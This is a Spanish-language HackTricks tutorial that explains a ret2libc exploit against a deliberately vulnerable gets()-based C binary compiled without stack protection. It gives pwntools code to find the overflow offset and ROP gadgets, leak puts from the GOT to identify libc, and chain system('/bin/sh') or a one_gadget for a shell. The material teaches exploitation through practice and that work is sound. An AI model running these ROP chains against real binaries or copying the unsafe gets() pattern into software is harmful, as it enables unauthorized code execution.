<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# Resumen r√°pido

1. **Encontrar** el **offset** de desbordamiento
2. **Encontrar** los gadgets `POP_RDI`, `PUTS_PLT` y `MAIN_PLT`
3. Usar los gadgets anteriores para **filtrar la direcci√≥n de memoria** de puts u otra funci√≥n de libc y **encontrar la versi√≥n de libc** ([descargarla](https://libc.blukat.me))
4. Con la biblioteca, **calcular el ROP y explotarlo**

# Otros tutoriales y binarios para practicar

Este tutorial va a explotar el c√≥digo/binario propuesto en este tutorial: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
Otros tutoriales √∫tiles: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

# C√≥digo

Nombre de archivo: `vuln.c`
```c
#include <stdio.h>

int main() {
    char buffer[32];
    puts("Simple ROP.\n");
    gets(buffer);

    return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector  -no-pie
```
# ROP - Plantilla para filtrar LIBC

Voy a utilizar el c√≥digo ubicado aqu√≠ para hacer el exploit.\
Descarga el exploit y col√≥calo en el mismo directorio que el binario vulnerable y proporciona los datos necesarios al script:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# 1- Encontrando el offset

La plantilla necesita un offset antes de continuar con el exploit. Si no se proporciona ninguno, ejecutar√° el c√≥digo necesario para encontrarlo (por defecto `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
    gdb.attach(p.pid, "c") #Attach and continue
    payload = cyclic(1000)
    print(r.clean())
    r.sendline(payload)
    #x/wx $rsp -- Search for bytes that crashed the application
    #cyclic_find(0x6161616b) # Find the offset of those bytes
    return
```
**Ejecuta** `python template.py` y se abrir√° una consola de GDB con el programa que se ha bloqueado. Dentro de esa **consola de GDB**, ejecuta `x/wx $rsp` para obtener los **bytes** que iban a sobrescribir el RIP. Finalmente, obt√©n el **desplazamiento** usando una consola de **python**:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../.gitbook/assets/image (140).png>)

Despu√©s de encontrar el desplazamiento (en este caso 40), cambie la variable OFFSET dentro de la plantilla usando ese valor.\
`OFFSET = "A" * 40`

Otra forma ser√≠a usar: `pattern create 1000` -- _ejecutar hasta ret_ -- `pattern search $rsp` desde GEF.

# 2- Encontrar Gadgets

Ahora necesitamos encontrar gadgets ROP dentro del binario. Estos gadgets ROP ser√°n √∫tiles para llamar a `puts` para encontrar la **libc** que se est√° utilizando, y m√°s tarde para **lanzar el exploit final**.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
El `PUTS_PLT` es necesario para llamar a la **funci√≥n puts**.\
El `MAIN_PLT` es necesario para llamar a la **funci√≥n principal** de nuevo despu√©s de una interacci√≥n para **explotar** el desbordamiento **nuevamente** (rondas infinitas de explotaci√≥n). **Se utiliza al final de cada ROP para llamar al programa de nuevo**.\
El **POP\_RDI** es necesario para **pasar** un **par√°metro** a la funci√≥n llamada.

En este paso no es necesario ejecutar nada ya que todo ser√° encontrado por pwntools durante la ejecuci√≥n.

# 3- Encontrando la biblioteca LIBC

Ahora es el momento de encontrar qu√© versi√≥n de la biblioteca **libc** se est√° utilizando. Para hacerlo, vamos a **filtrar** la **direcci√≥n** en memoria de la **funci√≥n** `puts` y luego vamos a **buscar** en qu√© **versi√≥n de la biblioteca** se encuentra la versi√≥n de puts en esa direcci√≥n.
```python
def get_addr(func_name):
    FUNC_GOT = elf.got[func_name]
    log.info(func_name + " GOT @ " + hex(FUNC_GOT))
    # Create rop chain
    rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

    #Send our rop-chain payload
    #p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
    print(p.clean()) # clean socket buffer (read all and print)
    p.sendline(rop1)

    #Parse leaked address
    recieved = p.recvline().strip()
    leak = u64(recieved.ljust(8, "\x00"))
    log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
    #If not libc yet, stop here
    if libc != "":
        libc.address = leak - libc.symbols[func_name] #Save libc base
        log.info("libc base @ %s" % hex(libc.address))
    
    return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
    print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
    p.interactive()
```
Para hacerlo, la l√≠nea m√°s importante del c√≥digo ejecutado es:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
Esto enviar√° algunos bytes hasta que sea posible **sobrescribir** el **RIP**: `OFFSET`.\
Luego, establecer√° la **direcci√≥n** del gadget `POP_RDI` para que la siguiente direcci√≥n (`FUNC_GOT`) se guarde en el registro **RDI**. Esto se debe a que queremos **llamar a puts** pas√°ndole la **direcci√≥n** de `PUTS_GOT` como la direcci√≥n en memoria de la funci√≥n puts se guarda en la direcci√≥n apuntada por `PUTS_GOT`.\
Despu√©s de eso, se llamar√° a `PUTS_PLT` (con `PUTS_GOT` dentro de **RDI**) para que puts **lea el contenido** dentro de `PUTS_GOT` (**la direcci√≥n de la funci√≥n puts en memoria**) y lo **imprima**.\
Finalmente, se llama a la **funci√≥n principal de nuevo** para que podamos explotar el desbordamiento de nuevo.

De esta manera, hemos **enga√±ado a la funci√≥n puts** para que **imprima** la **direcci√≥n** en **memoria** de la funci√≥n **puts** (que est√° dentro de la biblioteca **libc**). Ahora que tenemos esa direcci√≥n, podemos **buscar qu√© versi√≥n de libc se est√° utilizando**.

![](<../../../.gitbook/assets/image (141).png>)

Como estamos **explotando** un binario **local**, no es necesario averiguar qu√© versi√≥n de **libc** se est√° utilizando (solo hay que encontrar la biblioteca en `/lib/x86_64-linux-gnu/libc.so.6`).\
Pero, en caso de una explotaci√≥n remota, explicar√© aqu√≠ c√≥mo puedes encontrarla:

## 3.1- Buscando la versi√≥n de libc (1)

Puedes buscar qu√© biblioteca se est√° utilizando en la p√°gina web: [https://libc.blukat.me/](https://libc.blukat.me)\
Tambi√©n te permitir√° descargar la versi√≥n descubierta de **libc**

![](<../../../.gitbook/assets/image (142).png>)

## 3.2- Buscando la versi√≥n de libc (2)

Tambi√©n puedes hacer:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

Esto tomar√° alg√∫n tiempo, ten paciencia.\
Para que esto funcione, necesitamos:

* Nombre del s√≠mbolo de libc: `puts`
* Direcci√≥n de libc filtrada: `0x7ff629878690`

Podemos averiguar qu√© **libc** se est√° utilizando con mayor probabilidad.
```
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
Obtenemos 2 coincidencias (deber√≠as probar la segunda si la primera no funciona). Descarga la primera:
```
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
  -> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
  -> Downloading package
  -> Extracting package
  -> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
Copia la libc desde `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` a nuestro directorio de trabajo.

## 3.3- Otras funciones para hacer leak
```python
puts
printf
__libc_start_main
read
gets
```
# 4- Encontrando la direcci√≥n de la libc y explotando

En este punto, deber√≠amos saber qu√© biblioteca libc se est√° utilizando. Como estamos explotando un binario local, usar√© simplemente: `/lib/x86_64-linux-gnu/libc.so.6`

Entonces, al comienzo de `template.py`, cambie la variable **libc** a: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Establecer la ruta de la biblioteca cuando se conoce`

Dando la **ruta** a la **biblioteca libc**, el resto del **exploit se calcular√° autom√°ticamente**.

Dentro de la funci√≥n `get_addr`, se calcular√° la **direcci√≥n base de la libc**:
```python
if libc != "":
    libc.address = leak - libc.symbols[func_name] #Save libc base
    log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
Ten en cuenta que la **direcci√≥n final de la base de libc debe terminar en 00**. Si no es as√≠, es posible que hayas filtrado una biblioteca incorrecta.
{% endhint %}

Luego, la direcci√≥n de la funci√≥n `system` y la **direcci√≥n** de la cadena _"/bin/sh"_ se van a **calcular** a partir de la **direcci√≥n base** de **libc** y dada la **biblioteca libc**.
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
Finalmente, se va a preparar y enviar el exploit de ejecuci√≥n de /bin/sh:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
Explicaremos este √∫ltimo ROP. El √∫ltimo ROP (`rop1`) termin√≥ llamando de nuevo a la funci√≥n principal, por lo que podemos **explotar de nuevo** el **desbordamiento** (por eso el `OFFSET` est√° aqu√≠ de nuevo). Luego, queremos llamar a `POP_RDI` apuntando a la **direcci√≥n** de _"/bin/sh"_ (`BINSH`) y llamar a la funci√≥n **system** (`SYSTEM`) porque la direcci√≥n de _"/bin/sh"_ se pasar√° como par√°metro.\
Finalmente, se **llama a la direcci√≥n de la funci√≥n exit** para que el proceso **finalice correctamente** y no se genere ninguna alerta.

**De esta manera, el exploit ejecutar√° una shell de**_**/bin/sh**_**._

![](<../../../.gitbook/assets/image (143).png>)

# 4(2)- Usando ONE\_GADGET

Tambi√©n se podr√≠a usar [**ONE\_GADGET**](https://github.com/david942j/one_gadget) para obtener una shell en lugar de usar **system** y **"/bin/sh". ONE\_GADGET** encontrar√° dentro de la biblioteca libc alguna forma de obtener una shell usando solo una **direcci√≥n ROP**. \
Sin embargo, normalmente hay algunas restricciones, las m√°s comunes y f√°ciles de evitar son como `[rsp+0x30] == NULL`. Como controlas los valores dentro del **RSP**, solo tienes que enviar algunos valores NULL m√°s para evitar la restricci√≥n.

![](<../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
# ARCHIVO DE EXPLOTACI√ìN

Puedes encontrar una plantilla para explotar esta vulnerabilidad aqu√≠:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# Problemas comunes

## MAIN_PLT = elf.symbols\['main'] no encontrado

Si el s√≠mbolo "main" no existe, entonces puedes buscar d√≥nde est√° el c√≥digo principal:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
y establecer la direcci√≥n manualmente:
```python
MAIN_PLT = 0x401080
```
## Puts no encontrado

Si el binario no est√° usando Puts, debes verificar si est√° usando

## `sh: 1: %s%s%s%s%s%s%s%s: no encontrado`

Si encuentras este **error** despu√©s de crear **todos** los exploits: `sh: 1: %s%s%s%s%s%s%s%s: no encontrado`

Intenta **restar 64 bytes a la direcci√≥n de "/bin/sh"**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obt√©n la [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme en** **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
